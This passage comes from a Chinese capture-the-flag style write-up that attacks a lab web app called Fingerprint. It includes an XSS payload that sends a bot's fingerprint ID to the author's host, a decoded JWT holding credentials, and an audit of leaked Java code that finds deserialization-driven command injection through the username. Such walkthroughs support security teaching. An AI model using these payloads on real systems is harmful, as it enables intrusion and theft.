<p><img src="/img/Fingerprint.assets/test.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="test"></p>
<p>在验证成功存在XSS后，另一个可行的方案是使用XSS拿到可能存在的BOT的<code>fingerprint-ID</code>。所以构造payload如下，当然也可以封装成一个<code>evil.js</code>，然后放在本机让服务器来访问。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script src=<span class="hljs-string">&quot;http://10.10.11.127:8080/resources/js/login.js&quot;</span>&gt;&lt;/script&gt; <br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;&lt;img src=http://10.10.16.16/&quot;</span>+<span class="hljs-title function_">getFingerPrintID</span>()+<span class="hljs-string">&quot;&gt;&lt;/img&gt;&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>

<p>将payload输入后点击登录：</p>
<p><img src="/img/Fingerprint.assets/image-20220527211236544.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220527211236544"></p>
<p>稍等即可拿到BOT的<code>fingerprint-ID</code>。</p>
<p><img src="/img/Fingerprint.assets/image-20220527211334013.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220527211334013"></p>
<p>我们选择来自服务器的<code>fingerprint-ID</code>，即<code>962f4a03aa7ebc0515734cf398b0ccd6</code>。</p>
<p>输入该<code>fingerprint-ID</code>，和预期结果不太一样的是依旧是之前的报错信息：</p>
<p><img src="/img/Fingerprint.assets/image-20220527211710797.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220527211710797"></p>
<p>在确认之前的步骤没有问题后，一个推测是这个<code>fingerprint-ID</code>并不是admin的，而是另外的用户的。于是在假设<code>fingerprint-ID</code>唯一的情况下，我们可以将<code>username</code>中的逻辑取反，即让<code>username</code>不等于<code>admin</code>（使用<code>&lt;&gt;</code>）。再次尝试登录，结果如下：</p>
<p><img src="/img/Fingerprint.assets/image-20220527211650482.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220527211650482"></p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>点击链接，跳转到一个可以上传文件的页面。</p>
<p><img src="/img/Fingerprint.assets/image-20220527214841872.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220527214841872"></p>
<p>这里我的界面没有加载出来，也上传不了文件。一番探索后发现是被墙了，需要挂梯子。。</p>
<p>挂了梯子后页面能够正常加载了，也能正常上传文件了。</p>
<p><img src="/img/Fingerprint.assets/image-20220527215448645.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220527215448645"></p>
<p>上传文件后能够发现上传目录为<code>/data/uploads</code>。然后就没有别的了，也不能查看，也没有其他后续操作。</p>
<p><img src="/img/Fingerprint.assets/image-20220527215631785.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220527215631785"></p>
<h3 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h3><p>同时我们还发现了发送的数据包中有<code>JWT</code>的存在，复制出来放到<code>jwt.io</code>中进行解码，如下。然后使用之前拿到的<code>SECRET_KEY</code>能够成功校验签名。</p>
<p><img src="/img/Fingerprint.assets/image-20220527214026711.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220527214026711"></p>
<p><code>user</code>的值在解码后依旧不是明文，尝试再次base64解码，如下所示。可以看出大概这就是一个Java的序列化文件。通过这个字符串能够得出这是一个<code>User</code>对象，其他的字符串应该就是用户名、密码和<code>fingerprint-ID</code>了。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">➤</span>  <span class="hljs-string">echo</span> <span class="hljs-string">&quot;rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAnQAQDdlZjUyYzI1MWY4MDQ0Y2IxODcwMTM5OTI4OTFkMGU1OGNlOTE5NGRlN2Y1MzViMWI0ZmE2YmJmZTA4Njc4ZjZ0ABRMV2c3Z1VSMUVtWDdVTnhzSnhxWnQAC21pY2hlYWwxMjM1&quot;</span> <span class="hljs-string">|</span> <span class="hljs-string">base64</span> <span class="hljs-string">-d</span> <span class="hljs-string">|xxd</span><br><br><span class="hljs-attr">00000000:</span> <span class="hljs-string">aced</span> <span class="hljs-number">0005 </span><span class="hljs-number">7372 </span><span class="hljs-number">0021 </span><span class="hljs-string">636f</span> <span class="hljs-string">6d2e</span> <span class="hljs-number">6164 </span><span class="hljs-string">6d69</span>  <span class="hljs-string">....sr.!com.admi</span><br><span class="hljs-attr">00000010:</span> <span class="hljs-string">6e2e</span> <span class="hljs-number">7365 </span><span class="hljs-number">6375 </span><span class="hljs-number">7269 </span><span class="hljs-number">7479 </span><span class="hljs-number">2e73</span> <span class="hljs-number">7263 </span><span class="hljs-string">2e6d</span>  <span class="hljs-string">n.security.src.m</span><br><span class="hljs-attr">00000020:</span> <span class="hljs-string">6f64</span> <span class="hljs-string">656c</span> <span class="hljs-number">2e55</span> <span class="hljs-number">7365 </span><span class="hljs-number">7294 </span><span class="hljs-string">04d7</span> <span class="hljs-number">73e3</span> <span class="hljs-string">5fb9</span>  <span class="hljs-string">odel.User...s._.</span><br><span class="hljs-attr">00000030:</span> <span class="hljs-string">6b02</span> <span class="hljs-number">0004 </span><span class="hljs-number">4900 </span><span class="hljs-number">0269 </span><span class="hljs-string">644c</span> <span class="hljs-string">000b</span> <span class="hljs-number">6669 </span><span class="hljs-number">6e67</span>  <span class="hljs-string">k...I..idL..fing</span><br><span class="hljs-attr">00000040:</span> <span class="hljs-number">6572 </span><span class="hljs-number">7072 </span><span class="hljs-string">696e</span> <span class="hljs-number">7474 </span><span class="hljs-number">0012 </span><span class="hljs-string">4c6a</span> <span class="hljs-number">6176 </span><span class="hljs-string">612f</span>  <span class="hljs-string">erprintt..Ljava/</span><br><span class="hljs-attr">00000050:</span> <span class="hljs-string">6c61</span> <span class="hljs-number">6e67</span> <span class="hljs-string">2f53</span> <span class="hljs-number">7472 </span><span class="hljs-string">696e</span> <span class="hljs-string">673b</span> <span class="hljs-string">4c00</span> <span class="hljs-number">0870  </span><span class="hljs-string">lang/String;L..p</span><br><span class="hljs-attr">00000060:</span> <span class="hljs-number">6173 </span><span class="hljs-number">7377 </span><span class="hljs-string">6f72</span> <span class="hljs-number">6471 </span><span class="hljs-string">007e</span> <span class="hljs-number">0001 </span><span class="hljs-string">4c00</span> <span class="hljs-number">0875  </span><span class="hljs-string">asswordq.~..L..u</span><br><span class="hljs-attr">00000070:</span> <span class="hljs-number">7365 </span><span class="hljs-string">726e</span> <span class="hljs-string">616d</span> <span class="hljs-number">6571 </span><span class="hljs-string">007e</span> <span class="hljs-number">0001 </span><span class="hljs-number">7870 </span><span class="hljs-number">0000  </span><span class="hljs-string">sernameq.~..xp..</span><br><span class="hljs-attr">00000080:</span> <span class="hljs-number">0002 </span><span class="hljs-number">7400 </span><span class="hljs-number">4037 </span><span class="hljs-number">6566 </span><span class="hljs-number">3532 </span><span class="hljs-number">6332 </span><span class="hljs-number">3531 </span><span class="hljs-number">6638</span>  <span class="hljs-string">..t.@7ef52c251f8</span><br><span class="hljs-attr">00000090:</span> <span class="hljs-number">3034 </span><span class="hljs-number">3463 </span><span class="hljs-number">6231 </span><span class="hljs-number">3837 </span><span class="hljs-number">3031 </span><span class="hljs-number">3339 </span><span class="hljs-number">3932 </span><span class="hljs-number">3839  </span><span class="hljs-string">044cb18701399289</span><br><span class="hljs-attr">000000a0:</span> <span class="hljs-number">3164 </span><span class="hljs-number">3065 </span><span class="hljs-number">3538 </span><span class="hljs-number">6365 </span><span class="hljs-number">3931 </span><span class="hljs-number">3934 </span><span class="hljs-number">6465 </span><span class="hljs-number">3766  </span><span class="hljs-string">1d0e58ce9194de7f</span><br><span class="hljs-attr">000000b0:</span> <span class="hljs-number">3533 </span><span class="hljs-number">3562 </span><span class="hljs-number">3162 </span><span class="hljs-number">3466 </span><span class="hljs-number">6136 </span><span class="hljs-number">6262 </span><span class="hljs-number">6665 </span><span class="hljs-number">3038  </span><span class="hljs-string">535b1b4fa6bbfe08</span><br><span class="hljs-attr">000000c0:</span> <span class="hljs-number">3637 </span><span class="hljs-number">3866 </span><span class="hljs-number">3674 </span><span class="hljs-number">0014 </span><span class="hljs-string">4c57</span> <span class="hljs-number">6737 </span><span class="hljs-number">6755 </span><span class="hljs-number">5231  </span><span class="hljs-string">678f6t..LWg7gUR1</span><br><span class="hljs-attr">000000d0:</span> <span class="hljs-string">456d</span> <span class="hljs-number">5837 </span><span class="hljs-string">554e</span> <span class="hljs-number">7873 </span><span class="hljs-string">4a78</span> <span class="hljs-string">715a</span> <span class="hljs-number">7400 </span><span class="hljs-string">0b6d</span>  <span class="hljs-string">EmX7UNxsJxqZt..m</span><br><span class="hljs-attr">000000e0:</span> <span class="hljs-number">6963 </span><span class="hljs-number">6865 </span><span class="hljs-string">616c</span> <span class="hljs-number">3132 </span><span class="hljs-number">3335                 </span><span class="hljs-string">icheal1235</span><br></code></pre></td></tr></table></figure>



<p><code>file</code>命令也验证了这是一个序列化文件。</p>
<p><img src="/img/Fingerprint.assets/image-20220527214225003.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220527214225003"></p>
<h2 id="综合利用"><a href="#综合利用" class="headerlink" title="综合利用"></a>综合利用</h2><h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><p>利用的话应该就涉及到源代码的审计了，我们将之前拿到的几个java文件陈列如下：</p>
<p>User.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.admin.security.src.model;<br><br><span class="hljs-keyword">import</span> com.admin.security.src.utils.FileUtil;<br><span class="hljs-keyword">import</span> com.admin.security.src.utils.SerUtils;<br><span class="hljs-keyword">import</span> lombok.AllArgsConstructor;<br><span class="hljs-keyword">import</span> lombok.Data;<br><span class="hljs-keyword">import</span> lombok.NoArgsConstructor;<br><br><span class="hljs-keyword">import</span> javax.persistence.*;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-comment">// import com.admin.security.src.model.UserProfileStorage;</span><br><span class="hljs-meta">@AllArgsConstructor</span><br><span class="hljs-meta">@NoArgsConstructor</span><br><span class="hljs-meta">@Entity</span><br><span class="hljs-meta">@Data</span><br><span class="hljs-meta">@Table(name = &quot;users&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">7780857363453462165L</span>;<br><br>    <span class="hljs-meta">@Id</span><br>    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span><br>    <span class="hljs-meta">@Column(name = &quot;id&quot;)</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> id;<br><br>    <span class="hljs-meta">@Column(name = &quot;username&quot;)</span><br>    <span class="hljs-keyword">protected</span> String username;<br><br>    <span class="hljs-meta">@Column(name = &quot;password&quot;)</span><br>    <span class="hljs-keyword">protected</span> String password;<br><br>    <span class="hljs-meta">@Column(name = &quot;fingerprint&quot;)</span><br>    <span class="hljs-keyword">protected</span> String fingerprint;<br><br>    <span class="hljs-keyword">public</span> File <span class="hljs-title function_">getProfileLocation</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">File</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/data/sessions/&quot;</span>);<br>        dir.mkdirs();<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">pathname</span> <span class="hljs-operator">=</span> dir.getAbsolutePath() + <span class="hljs-string">&quot;/&quot;</span> + username + <span class="hljs-string">&quot;.ser&quot;</span>;<br>        <span class="hljs-keyword">return</span> Paths.get(pathname).normalize().toFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAdmin</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> username.equals(<span class="hljs-string">&quot;admin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateProfile</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Profile profile)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] res = SerUtils.toByteArray(profile);<br>        FileUtil.write(res, getProfileLocation());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Profile.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.admin.security.src.model;<br><br><span class="hljs-keyword">import</span> com.admin.security.src.profile.UserProfileStorage;<br><span class="hljs-keyword">import</span> lombok.Data;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Profile</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">3995854114743474071L</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;String&gt; logs;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> adminProfile;<br><br>    <span class="hljs-keyword">private</span> File avatar;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Profile <span class="hljs-title function_">getForUser</span><span class="hljs-params">(<span class="hljs-keyword">final</span> User user)</span> &#123;<br>        <span class="hljs-comment">// fetch locally saved profile</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> user.getProfileLocation();<br><br>        Profile profile;<br><br>        <span class="hljs-keyword">if</span> (!file.isFile()) &#123;<br>            <span class="hljs-comment">// no file -&gt; create empty profile</span><br>            profile = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Profile</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(), user.isAdmin());<br>            <span class="hljs-keyword">try</span> &#123;<br>                user.updateProfile(profile);<br>            &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-keyword">final</span> IOException ignored) &#123;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// init logs etc.</span><br>        profile = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserProfileStorage</span>(user).readProfile();<br><br>        <span class="hljs-keyword">return</span> profile;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>以上两个java文件是扫目录得出来的，然后通过<code>import com.admin.security.src.profile.UserProfileStorage;</code>这句话又找到了一个<code>UserProfileStorage.java</code>文件，如下：</p>
<p>UserProfileStorage.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.admin.security.src.profile;<br><br><span class="hljs-keyword">import</span> com.admin.security.src.model.Profile;<br><span class="hljs-keyword">import</span> com.admin.security.src.model.User;<br><span class="hljs-keyword">import</span> com.admin.security.src.utils.SerUtils;<br><span class="hljs-keyword">import</span> com.admin.security.src.utils.Terminal;<br><span class="hljs-keyword">import</span> lombok.AllArgsConstructor;<br><span class="hljs-keyword">import</span> lombok.Data;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Path;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> com.admin.security.src.profile.Settings.AUTH_LOG;<br><br><span class="hljs-meta">@Data</span><br><span class="hljs-meta">@AllArgsConstructor</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserProfileStorage</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">5667788713462095525L</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> User user;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> ObjectInputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        inputStream.defaultReadObject();<br>        readProfile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Profile <span class="hljs-title function_">readProfile</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IllegalStateException &#123;<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">File</span> <span class="hljs-variable">profileFile</span> <span class="hljs-operator">=</span> user.getProfileLocation();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(profileFile.getAbsolutePath());<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] content = Files.readAllBytes(path);<br><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">Profile</span> <span class="hljs-variable">profile</span> <span class="hljs-operator">=</span> (Profile) SerUtils.from(content);<br>            <span class="hljs-keyword">if</span> (profile.isAdminProfile()) &#123; <span class="hljs-comment">// load authentication logs only for super user</span><br>                profile.getLogs().clear();<br>                <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;cat &quot;</span> + AUTH_LOG.getAbsolutePath() + <span class="hljs-string">&quot; | grep &quot;</span> + user.getUsername();<br>                profile.getLogs().addAll(Arrays.asList(Terminal.run(cmd).split(<span class="hljs-string">&quot;\n&quot;</span>)));<br>            &#125;<br>            <span class="hljs-keyword">return</span> profile;<br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-keyword">final</span> Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">&quot;Error fetching profile&quot;</span>);<br>        &#125;<br><br><br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在<code>UserProfileStorage.java</code>中有这样一句话应该是潜在的系统命令执行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;cat &quot;</span> + AUTH_LOG.getAbsolutePath() + <span class="hljs-string">&quot; | grep &quot;</span> + user.getUsername();<br></code></pre></td></tr></table></figure>

<p>我们假设在传入Cookie后后端通过<code>readObject</code>还原出我们可控的<code>UserProfileStorage</code>对象，则我们可以尝试在<code>cmd</code>中注入命令达到命令执行。</p>
<blockquote>
<p>但是这里有一个疑问是我们的Cookie中反序列化得到的是User对象（前面的file命令），不是User对象，但尝试了一下两个对象都可以利用。</p>
</blockquote>
<p>而如果我们要想执行<code>cmd</code>这句话，首先是要让<code>profile.isAdminProfile()</code>这个<code>boolean</code>值为真。</p>
<p>往前看能够看到一个<code>user.getProfileLocation()</code>指示了读取文件的位置。而我们目前可控的有jwt亦即<code>User</code>对象，通过控制<code>User</code>对象中的<code>username</code>理论上我们就能控制<code>getProfileLocation()</code>返回的最终路径，从而控制读取的<code>profile</code>文件，最后控制生成的<code>Profile</code>对象。</p>
<p>而profile文件也是我们可控的，因为存在着上传的功能点，同时通过返回的路径我们也能定位到上传的文件。</p>
<p>再一个就是要怎么通过<code>username</code>来同时兼顾命令注入的问题。注意到在User.java中的<code>getProfileLocation</code>函数中最后返回了这个：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Paths</span>.</span></span>get(pathname).normalize<span class="hljs-literal">()</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">File()</span>;<br></code></pre></td></tr></table></figure>

<p>测试一下可以发现在注入命令后解析依旧是没问题的。</p>
<p><img src="/img/Fingerprint.assets/image-20220528110515414.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220528110515414"></p>
<p><img src="/img/Fingerprint.assets/image-20220528110937198.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220528110937198"></p>
<h3 id="工程"><a href="#工程" class="headerlink" title="工程"></a>工程</h3><p>在测试没有问题后我们需要着手构造我们的序列化文件了。我们直接在现有的从<code>backup</code>文件夹中拿到的源代码的基础上建立工程文件即可。</p>
<blockquote>
<p>这里我们需要生成两个文件，一个是profile的序列化文件（上传），一个是user的序列化文件（放在cookie里）。</p>
</blockquote>
<p>这里使用了maven来管理依赖。</p>
<p>我们首先要做的是要补全FileUtil和SerUtils这两个工具类文件。最后得出的结果如下：</p>
<blockquote>
<p>参考了如下几个网站的写法：</p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/2836646/java-serializable-object-to-byte-array">https://stackoverflow.com/questions/2836646/java-serializable-object-to-byte-array</a></p>
<p><a target="_blank" rel="noopener" href="https://www.tutorialspoint.com/How-to-convert-an-object-to-byte-array-in-java">https://www.tutorialspoint.com/How-to-convert-an-object-to-byte-array-in-java</a></p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/3736058/java-object-to-byte-and-byte-to-object-converter-for-tokyo-cabinet/3736091">https://stackoverflow.com/questions/3736058/java-object-to-byte-and-byte-to-object-converter-for-tokyo-cabinet/3736091</a></p>
</blockquote>
<p>FileUtil.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.admin.security.src.utils;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileUtil</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] data, <span class="hljs-keyword">final</span> File file)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                <span class="hljs-keyword">if</span> (!file.isFile()) &#123;<br>                        file.createNewFile();<br>                &#125;<br>                Files.write(Paths.get(file.getAbsolutePath()), data);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>SerUtils.java</p>
